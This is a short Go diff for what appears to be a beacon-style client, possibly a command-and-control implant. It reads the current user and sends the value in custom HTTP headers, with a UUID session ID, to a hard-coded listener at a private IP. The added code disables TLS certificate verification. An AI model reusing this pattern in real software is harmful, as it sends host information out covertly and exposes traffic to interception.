@@ -4,6 +4,7 @@ import (
 	"crypto"
 	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/hex"
 	"encoding/pem"
@@ -103,7 +104,10 @@ func main() {
 	uuidWithHyphen := uuid.New()
 	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
-	client := http.Client{}
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
 
 	user := getCurrentUser()
 	result := string(user)
@@ -117,8 +121,9 @@ func main() {
 	//fmt.Printf(string_toSend)
 
 	//time.Sleep(10)
-	req, err := http.NewRequest("GET", "http://192.168.1.179:8000/", nil)
+	req, _ := http.NewRequest("GET", "http://192.168.1.179:8000/", nil)
 	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {result}}
+	//client.Transport = &http2.Transport{}
 	resp, err := client.Do(req)
 
 	if err != nil {
